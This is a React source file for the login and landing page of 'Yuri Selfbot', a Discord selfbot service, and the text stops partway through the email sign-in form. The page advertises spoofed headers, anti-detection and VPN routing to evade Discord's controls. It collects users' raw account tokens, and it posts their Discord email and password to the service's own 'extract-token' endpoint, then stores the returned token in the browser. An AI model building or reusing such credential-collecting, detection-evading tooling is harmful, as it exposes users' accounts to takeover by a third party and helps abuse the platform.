import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { api } from '../services/api';
import { 
  Globe, 
  MapPin, 
  Search, 
  Shield, 
  ShieldAlert, 
  X, 
  Copy, 
  Check, 
  MessageSquare,
  Zap,
  Bot,
  Radio,
  Sliders,
  Terminal,
  ChevronRight,
  ExternalLink,
  Sparkles,
  Lock,
  ArrowRight,
  Play
} from 'lucide-react';

interface LoginProps {
  onLoginSuccess: () => void;
}

const VPN_COUNTRIES = [
  { id: 'us', name: 'United States', flag: '🇺🇸', latency: '42ms' },
  { id: 'gb', name: 'United Kingdom', flag: '🇬🇧', latency: '18ms' },
  { id: 'ca', name: 'Canada', flag: '🇨🇦', latency: '55ms' },
  { id: 'de', name: 'Germany', flag: '🇩🇪', latency: '12ms' },
  { id: 'fr', name: 'France', flag: '🇫🇷', latency: '15ms' },
  { id: 'nl', name: 'Netherlands', flag: '🇳🇱', latency: '14ms' },
  { id: 'jp', name: 'Japan', flag: '🇯🇵', latency: '210ms' },
  { id: 'sg', name: 'Singapore', flag: '🇸🇬', latency: '180ms' },
  { id: 'au', name: 'Australia', flag: '🇦🇺', latency: '240ms' },
  { id: 'br', name: 'Brazil', flag: '🇧🇷', latency: '145ms' },
  { id: 'in', name: 'India', flag: '🇮🇳', latency: '160ms' },
  { id: 'kr', name: 'South Korea', flag: '🇰🇷', latency: '195ms' },
  { id: 'se', name: 'Sweden', flag: '🇸🇪', latency: '22ms' },
  { id: 'ch', name: 'Switzerland', flag: '🇨🇭', latency: '19ms' },
];

export default function Login({ onLoginSuccess }: LoginProps) {
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [token, setToken] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [activeTab, setActiveTab] = useState<'login' | 'email' | 'getToken' | 'oauth'>('login');
  
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showPrivacyModal, setShowPrivacyModal] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(() => localStorage.getItem('yuri_tos_accepted') === 'true');
  const handleAcceptTerms = (checked: boolean) => {
    setTermsAccepted(checked);
    if (checked) localStorage.setItem('yuri_tos_accepted', 'true');
    else localStorage.removeItem('yuri_tos_accepted');
  };
  
  const [showVpnModal, setShowVpnModal] = useState(false);
  const [vpnEnabled, setVpnEnabled] = useState(false);
  const [vpnCountry, setVpnCountry] = useState(VPN_COUNTRIES[0]);
  const [vpnSearch, setVpnSearch] = useState('');
  
  const [showCommunityModal, setShowCommunityModal] = useState(false);
  const [communityCopied, setCommunityCopied] = useState(false);
  const handleCopyCommunityLink = async () => {
    const inviteLink = 'https://discord.gg/z5BwKZwtVe';
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        await navigator.clipboard.writeText(inviteLink);
      } else {
        const textarea = document.createElement('textarea');
        textarea.value = inviteLink;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      }
      setCommunityCopied(true);
      setTimeout(() => setCommunityCopied(false), 2500);
      window.open(inviteLink, '_blank');
    } catch (err) {
      console.error('Failed to copy community link:', err);
    }
  };
  
  const [discordUser, setDiscordUser] = useState<any>(() => {
    const saved = localStorage.getItem('discord_user');
    return saved ? JSON.parse(saved) : null;
  });

  React.useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === 'OAUTH_AUTH_SUCCESS' && event.data.user) {
        const user = event.data.user;
        setDiscordUser(user);
        localStorage.setItem('discord_user', JSON.stringify(user));
      }
    };
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  const handleDiscordLogin = async () => {
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    try {
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const res = await fetch(`/api/auth/discord/url?redirect_uri=${redirectUri}&client_id=1545409686164086834`);
      const data = await res.json();
      if (data?.url) {
        window.open(data.url, 'discord_auth', 'width=600,height=700');
      } else {
        throw new Error('No OAuth URL returned');
      }
    } catch (e) {
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const directUrl = `https://discord.com/api/oauth2/authorize?client_id=1545409686164086834&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email%20guilds.join`;
      window.open(directUrl, 'discord_auth', 'width=600,height=700');
    }
  };

  const handleTokenSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    
    try {
      const res = await api.login(token);
      localStorage.setItem('token', res.session.token);
      localStorage.setItem('catalystcord_user_token', res.session.token);
      localStorage.setItem('token_user', JSON.stringify(res.session));
      onLoginSuccess();
    } catch (err: any) {
      setError(err.message || 'Invalid token or connection failed.');
    } finally {
      setLoading(false);
    }
  };

  const [copiedToken, setCopiedToken] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    setCopySuccess(false);
    
    try {
      const res = await fetch('/api/auth/extract-token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      const data = await res.json();
      
      if (!res.ok || !data.success || !data.token) {
        throw new Error(data.error || 'Failed to extract token from Discord.');
      }
      
      const extractedToken = data.token;
      setCopiedToken(extractedToken);
      setCopySuccess(true);
      
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(extractedToken);
        } else {
          const textarea = document.createElement('textarea');
          textarea.value = extractedToken;
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
        }
      } catch (copyErr) {
        console.warn('Clipboard write failed:', copyErr);
      }
      
      const loginRes = await api.login(extractedToken);
      localStorage.setItem('token', loginRes.session.token);
      localStorage.setItem('catalystcord_user_token', loginRes.session.token);
      localStorage.setItem('token_user', JSON.stringify(loginRes.session));
      
      setTimeout(() => {
        onLoginSuccess();
      }, 1200);
      
    } catch (err: any) {
      setError(err.message || 'Authentication error.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#070709] text-zinc-100 font-sans relative overflow-x-hidden selection:bg-red-500/30">
      {/* Dynamic Background Media & Subtle Ambient Mesh */}
      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden">
        <div className="absolute -top-40 -left-40 w-[600px] h-[600px] bg-red-600/10 rounded-full blur-[140px]" />
        <div className="absolute top-1/3 -right-40 w-[500px] h-[500px] bg-indigo-600/10 rounded-full blur-[140px]" />
        <div className="absolute inset-0 bg-[radial-gradient(#ffffff0a_1px,transparent_1px)] [background-size:24px_24px] opacity-40" />
      </div>

      {/* Top Navigation */}
      <header className="relative z-20 border-b border-white/5 backdrop-blur-xl bg-black/40 sticky top-0">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2.5 cursor-pointer" onClick={() => setShowAuthModal(false)}>
              <div className="w-8 h-8 rounded-lg bg-gradient-to-tr from-red-600 to-red-400 p-[1px] shadow-lg shadow-red-500/20">
                <div className="w-full h-full bg-black rounded-[7px] flex items-center justify-center">
                  <span className="text-red-400 font-black text-xs tracking-tighter">YURI</span>
                </div>
              </div>
              <span className="font-semibold text-white tracking-tight text-base">Yuri Selfbot</span>
            </div>
            <span className="hidden sm:inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-mono font-medium bg-red-500/10 text-red-400 border border-red-500/20">
              <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
              24/7 NETWORK OPERATIONAL
            </span>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={() => setShowCommunityModal(true)}
              className="text-xs px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white border border-white/5 transition-colors hidden md:flex items-center gap-1.5"
            >
              <MessageSquare className="w-3.5 h-3.5 text-[#5865F2]" />
              <span>Community</span>
            </button>

            <button
              onClick={() => {
                window.history.pushState({}, '', '/console');
                window.dispatchEvent(new Event('popstate'));
              }}
              className="text-xs px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white border border-white/5 transition-colors hidden sm:flex items-center gap-1.5"
            >
              <Terminal className="w-3.5 h-3.5 text-zinc-400" />
              <span>Terminal</span>
            </button>

            <button
              onClick={() => setShowVpnModal(true)}
              className={`text-xs px-3 py-1.5 rounded-lg border transition-all flex items-center gap-1.5 ${
                vpnEnabled 
                  ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                  : 'bg-white/5 border-white/5 text-zinc-300 hover:text-white'
              }`}
            >
              <Shield className="w-3.5 h-3.5" />
              <span className="uppercase font-mono">{vpnEnabled ? vpnCountry.id : 'VPN'}</span>
            </button>

            <button
              onClick={() => setShowAuthModal(true)}
              className="text-xs font-semibold px-4 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white shadow-lg shadow-red-950/40 transition-all flex items-center gap-1.5"
            >
              <span>Get Started</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </header>

      {/* Main Landing Page Content */}
      <main className="relative z-10 max-w-7xl mx-auto px-6 py-12 md:py-20 space-y-24">
        
        {/* Hero Section: "Yuri Selfbot: Why Should You Use This?" */}
        <section className="text-center space-y-8 max-w-4xl mx-auto">
          <motion.div 
            initial={{ opacity: 0, y: 15 }} 
            animate={{ opacity: 1, y: 0 }}
            className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-mono tracking-wide"
          >
            <Sparkles className="w-3.5 h-3.5" />
            <span>UNCOMPROMISING PRECISION & 24/7 DEDICATED COMPANION</span>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }} 
            transition={{ delay: 0.1 }}
            className="space-y-4"
          >
            <h1 className="text-4xl sm:text-5xl md:text-6xl font-extrabold tracking-tight text-white leading-[1.15]">
              Yuri Selfbot <br />
              <span className="bg-gradient-to-r from-red-400 via-rose-300 to-zinc-400 bg-clip-text text-transparent">
                Why Should You Use This?
              </span>
            </h1>
            <p className="text-base sm:text-lg text-zinc-400 max-w-2xl mx-auto leading-relaxed font-normal">
              Built from the ground up for enthusiasts who demand zero-lag responsiveness, stealth spoofing, and a dedicated 24/7 companion bot that operates seamlessly in every server and direct message.
            </p>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }} 
            transition={{ delay: 0.2 }}
            className="flex flex-wrap items-center justify-center gap-4 pt-2"
          >
            <button
              onClick={() => {
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-6 py-3.5 rounded-xl bg-red-600 hover:bg-red-500 text-white font-semibold text-sm shadow-xl shadow-red-900/30 transition-all flex items-center gap-2.5 active:scale-95 cursor-pointer"
            >
              <span>Get Started with Yuri</span>
              <ArrowRight className="w-4 h-4" />
            </button>

            <button
              onClick={() => setShowCommunityModal(true)}
              className="px-6 py-3.5 rounded-xl bg-white/5 hover:bg-white/10 text-zinc-200 border border-white/10 font-medium text-sm transition-all flex items-center gap-2 active:scale-95 cursor-pointer"
            >
              <MessageSquare className="w-4 h-4 text-[#5865F2]" />
              <span>Join Official Discord</span>
            </button>
          </motion.div>

          {/* Quick Metrics Bar */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-6 max-w-3xl mx-auto">
            <div className="bg-white/[0.03] border border-white/5 rounded-2xl p-4 text-center">
              <div className="text-2xl font-bold font-mono text-white">99.9%</div>
              <div className="text-xs text-zinc-500 uppercase tracking-wider mt-1">24/7 Uptime</div>
            </div>
            <div className="bg-white/[0.03] border border-white/5 rounded-2xl p-4 text-center">
              <div className="text-2xl font-bold font-mono text-emerald-400">&lt; 38ms</div>
              <div className="text-xs text-zinc-500 uppercase tracking-wider mt-1">Gateway Ping</div>
            </div>
            <div className="bg-white/[0.03] border border-white/5 rounded-2xl p-4 text-center">
              <div className="text-2xl font-bold font-mono text-red-400">Pure Embed</div>
              <div className="text-xs text-zinc-500 uppercase tracking-wider mt-1">Companion Output</div>
            </div>
            <div className="bg-white/[0.03] border border-white/5 rounded-2xl p-4 text-center">
              <div className="text-2xl font-bold font-mono text-white">Slash &amp; Prefix</div>
              <div className="text-xs text-zinc-500 uppercase tracking-wider mt-1">Full Command Parity</div>
            </div>
          </div>
        </section>

        {/* Media & Interactive Feature Demonstration */}
        <section className="relative rounded-3xl border border-white/10 bg-gradient-to-b from-zinc-900/60 to-black/80 p-8 sm:p-12 overflow-hidden shadow-2xl">
          <div className="absolute top-0 right-0 w-96 h-96 bg-red-600/10 rounded-full blur-[100px] pointer-events-none" />
          
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
            <div className="lg:col-span-5 space-y-6">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 text-xs font-mono">
                <Bot className="w-3.5 h-3.5" />
                <span>24/7 DEDICATED COMPANION</span>
              </div>
              <h2 className="text-3xl font-bold text-white tracking-tight">
                Designed For Speed, Crafted for Longevity
              </h2>
              <p className="text-sm text-zinc-400 leading-relaxed">
                Why settle for standard Discord limitations? Yuri combines a high-speed local selfbot engine with an independent 24/7 companion bot.
              </p>

              <ul className="space-y-3.5 text-sm text-zinc-300">
                <li className="flex items-start gap-3">
                  <div className="w-5 h-5 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center shrink-0 mt-0.5">
                    <Check className="w-3 h-3" />
                  </div>
                  <div>
                    <strong className="text-white">Pure Embed Companion Output:</strong> The 24/7 Companion formats every profile, server stat, and role command in styled crimson Discord embeds.
                  </div>
                </li>
                <li className="flex items-start gap-3">
                  <div className="w-5 h-5 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center shrink-0 mt-0.5">
                    <Check className="w-3 h-3" />
                  </div>
                  <div>
                    <strong className="text-white">Active Slash Command Integration:</strong> Full Discord application commands (`/giverole`, `/whois`, `/avatar`, `/banner`, `/serverinfo`).
                  </div>
                </li>
                <li className="flex items-start gap-3">
                  <div className="w-5 h-5 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center shrink-0 mt-0.5">
                    <Check className="w-3 h-3" />
                  </div>
                  <div>
                    <strong className="text-white">Anti-Detection &amp; Rate-Limit Cloak:</strong> Spoofed headers and client heartbeats protect your active accounts.
                  </div>
                </li>
              </ul>

              <div className="pt-2">
                <button
                  onClick={() => setShowAuthModal(true)}
                  className="px-5 py-3 rounded-xl bg-white text-zinc-900 font-semibold text-xs hover:bg-zinc-200 transition-all flex items-center gap-2 cursor-pointer"
                >
                  <span>Launch Yuri Now</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>

            {/* Visual Media Showcase: Video Loop / Interactive Embed Card */}
            <div className="lg:col-span-7">
              <div className="rounded-2xl border border-white/10 bg-black/80 shadow-2xl p-4 sm:p-6 space-y-4">
                {/* Simulated Discord Window Header */}
                <div className="flex items-center justify-between pb-3 border-b border-white/5 text-xs text-zinc-400">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 rounded-full bg-red-500/80" />
                    <div className="w-3 h-3 rounded-full bg-yellow-500/80" />
                    <div className="w-3 h-3 rounded-full bg-green-500/80" />
                    <span className="ml-2 font-mono text-zinc-400">#yuri-companion-preview</span>
                  </div>
                  <span className="font-mono text-[10px] text-zinc-500">Gateway Active (38ms)</span>
                </div>

                {/* Simulated Discord Embed */}
                <div className="space-y-4 pt-2">
                  <div className="flex items-start gap-3">
                    <img 
                      src="https://i.pinimg.com/originals/5f/a0/e3/5fa0e3e226de58362578fd5e28caabf1.gif" 
                      alt="Yuri Avatar" 
                      className="w-10 h-10 rounded-full border border-red-500/30 object-cover"
                      referrerPolicy="no-referrer"
                    />
                    <div className="space-y-2 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="font-semibold text-sm text-white">Yuri Selfbot Companion</span>
                        <span className="text-[10px] font-bold bg-[#5865F2] text-white px-1.5 py-0.2 rounded">BOT</span>
                        <span className="text-[10px] text-zinc-500">Today at 12:00</span>
                      </div>

                      {/* Discord Embed preview */}
                      <div className="border-l-4 border-red-500 bg-zinc-900/90 rounded-r-xl p-4 space-y-3 shadow-lg">
                        <div className="flex items-center justify-between">
                          <div className="text-xs font-bold text-white">🛡️ Role Granted Successfully</div>
                          <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">EXECUTED</span>
                        </div>
                        <p className="text-xs text-zinc-300">
                          Assigned role <span className="text-red-400 bg-red-500/10 px-1.5 py-0.5 rounded font-mono">@VIP Elite</span> to <span className="text-white font-medium">@harumi</span> in guild <strong className="text-zinc-200">Yuri HQ</strong>.
                        </p>
                        <div className="grid grid-cols-2 gap-2 text-[11px] bg-black/40 p-2.5 rounded-lg border border-white/5">
                          <div>
                            <span className="text-zinc-500 block">Command</span>
                            <span className="font-mono text-zinc-300">/giverole</span>
                          </div>
                          <div>
                            <span className="text-zinc-500 block">Status</span>
                            <span className="font-mono text-emerald-400">Verified Selfbot User</span>
                          </div>
                        </div>
                        <div className="text-[10px] text-zinc-500 pt-1 border-t border-white/5 flex items-center justify-between font-mono">
                          <span>Yuri Selfbot Companion • Role Administration</span>
                          <span>Pure Embed Architecture</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Animated Graphic Media Strip */}
                <div className="relative rounded-xl overflow-hidden border border-white/5 mt-4 group">
                  <img 
                    src="https://i.pinimg.com/originals/5f/a0/e3/5fa0e3e226de58362578fd5e28caabf1.gif" 
                    alt="Yuri Showcase" 
                    className="w-full h-32 object-cover object-center opacity-40 group-hover:opacity-60 transition-opacity"
                    referrerPolicy="no-referrer"
                  />
                  <div className="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-transparent flex items-end p-3">
                    <div className="text-xs font-mono text-zinc-300 flex items-center justify-between w-full">
                      <span className="flex items-center gap-2">
                        <span className="w-2 h-2 rounded-full bg-red-400 animate-pulse" />
                        24/7 Companion Service Online
                      </span>
                      <span className="text-zinc-500">Live Telemetry</span>
                    </div>
                  </div>
                </div>

              </div>
            </div>
          </div>
        </section>

        {/* Feature Pillar Cards */}
        <section className="space-y-8">
          <div className="text-center space-y-2 max-w-xl mx-auto">
            <h2 className="text-2xl sm:text-3xl font-bold text-white tracking-tight">
              Everything You Need in One Unified Suite
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400">
              High-performance automation tailored for Discord power users.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="bg-[#111114] border border-white/5 hover:border-red-500/30 rounded-2xl p-6 transition-all space-y-4 group">
              <div className="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 group-hover:scale-105 transition-transform">
                <Shield className="w-5 h-5" />
              </div>
              <h3 className="text-base font-semibold text-white">Stealth Handshake &amp; VPN</h3>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Spoofed client identifiers, dynamic WebSocket pacing, and built-in multi-region VPN routing hide your true footprint.
              </p>
            </div>

            <div className="bg-[#111114] border border-white/5 hover:border-red-500/30 rounded-2xl p-6 transition-all space-y-4 group">
              <div className="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 group-hover:scale-105 transition-transform">
                <Sliders className="w-5 h-5" />
              </div>
              <h3 className="text-base font-semibold text-white">Full Command Parity</h3>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Selfbot commands run with clean straight-line syntax, while the 24/7 companion answers in rich Discord embeds.
              </p>
            </div>

            <div className="bg-[#111114] border border-white/5 hover:border-red-500/30 rounded-2xl p-6 transition-all space-y-4 group">
              <div className="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 group-hover:scale-105 transition-transform">
                <Radio className="w-5 h-5" />
              </div>
              <h3 className="text-base font-semibold text-white">Voice &amp; RPC Soundboard</h3>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Stream camera, screenshare, soundboard sounds, and customize multi-presence status directly to voice channels.
              </p>
            </div>
          </div>
        </section>

        {/* CTA Footer Card */}
        <section className="rounded-3xl border border-red-500/20 bg-gradient-to-r from-red-950/30 via-zinc-900 to-black p-8 sm:p-12 text-center space-y-6 shadow-xl">
          <h2 className="text-3xl font-bold text-white">Ready to Elevate Your Discord Experience?</h2>
          <p className="text-sm text-zinc-400 max-w-xl mx-auto">
            Click Get Started to connect your token, extract credentials, or link via Discord OAuth.
          </p>
          <div className="pt-2">
            <button
              onClick={() => {
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-8 py-4 rounded-xl bg-red-600 hover:bg-red-500 text-white font-semibold text-sm shadow-xl shadow-red-900/40 transition-all cursor-pointer inline-flex items-center gap-2 active:scale-95"
            >
              <span>Get Started Immediately</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </section>

        <footer className="pt-8 pb-4 text-center text-xs text-zinc-600 font-mono border-t border-white/5 space-y-2">
          <div>©️ {new Date().getFullYear()} Yuri Selfbot. All rights reserved. Registered architecture.</div>
          <div className="text-[9px] text-zinc-700 select-none opacity-40 hover:opacity-100 transition-opacity">
            crafted by harumi (@myeyesaregoingdownx)
          </div>
        </footer>

      </main>

      {/* ========================================================= */}
      {/* AUTHENTICATION MODAL (Triggered by "Get Started")          */}
      {/* ========================================================= */}
      <AnimatePresence>
        {showAuthModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-xl overflow-y-auto"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} 
              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-[460px] p-6 sm:p-8 bg-zinc-950 border border-white/10 rounded-3xl shadow-2xl z-10 relative my-auto max-h-[92vh] overflow-y-auto custom-scrollbar"
            >
              <button 
                onClick={() => setShowAuthModal(false)}
                className="absolute top-5 right-5 p-2 text-zinc-400 hover:text-white bg-white/5 hover:bg-white/10 rounded-full transition-colors"
                title="Close"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="mb-6 text-center">
                <div 
                  className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-red-600/20 border border-red-500/40 mb-4 shadow-inner cursor-pointer"
                  onClick={() => window.open('https://discord.com/login', '_blank')}
                >
                  <svg className="w-7 h-7 text-red-500" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
                  </svg>
                </div>
                
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1">Sign In to Yuri</h2>
                <p className="text-xs text-zinc-400">Choose your authentication method to proceed</p>

                <div className="flex flex-wrap justify-center gap-2 sm:gap-4 mt-5 border-b border-white/5 pb-3">
                  <button 
                    onClick={() => setActiveTab('login')}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all ${activeTab === 'login' ? 'text-white bg-white/10' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Token Login
                  </button>
                  <button 
                    onClick={() => setActiveTab('email')}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all ${activeTab === 'email' ? 'text-white bg-white/10' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Email Login
                  </button>
                  <button 
                    onClick={() => setActiveTab('oauth')}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all ${activeTab === 'oauth' ? 'text-white bg-white/10' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    OAuth
                  </button>
                  <button 
                    onClick={() => setActiveTab('getToken')}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all ${activeTab === 'getToken' ? 'text-white bg-white/10' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Guide
                  </button>
                </div>
              </div>

              {activeTab === 'oauth' ? (
                <div className="space-y-5">
                  <div className="p-3.5 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-200 text-xs leading-relaxed">
                    <p className="font-semibold text-amber-400 mb-1">⚠️ Note on OAuth:</p>
                    <p>
                      OAuth provides dashboard viewing access. Full Discord client automation, RPC customization, and gateway voice operations require an account Token.
                    </p>
                  </div>

                  <button
                    onClick={handleDiscordLogin}
                    className="w-full py-3.5 bg-indigo-600 hover:bg-indigo-500 text-white font-medium text-sm rounded-xl transition-all flex items-center justify-center gap-2.5 shadow-lg shadow-indigo-950/40"
                  >
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
                    <span>Authorize with Discord OAuth</span>
                  </button>
                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}
                </div>
              ) : activeTab === 'login' ? (
                <form onSubmit={handleTokenSubmit} className="space-y-4">
                  <div>
                    <input
                      type="password"
                      value={token}
                      onChange={(e) => setToken(e.target.value)}
                      placeholder="Discord Account Token"
                      className="w-full px-4 py-3.5 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm"
                      required
                    />
                  </div>

                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-red-600 hover:bg-red-500 text-white font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-lg shadow-red-950/40"
                  >
                    {loading ? 'Authenticating...' : 'Enter Yuri Dashboard'}
                  </button>
                </form>
              ) : activeTab === 'email' ? (
                <form onSubmit={handleEmailSubmit} className="space-y-4">
                  <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-3 flex gap-2.5 text-red-200">
                    <ShieldAlert className="w-4 h-4 shrink-0 text-red-400 mt-0.5" />
                    <div className="text-xs">
                      <p className="font-semibold text-red-400">VPN Recommended:</p>
                      <p>Enable VPN before logging in with email/password to prevent Discord verification lock.</p>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Discord Email"
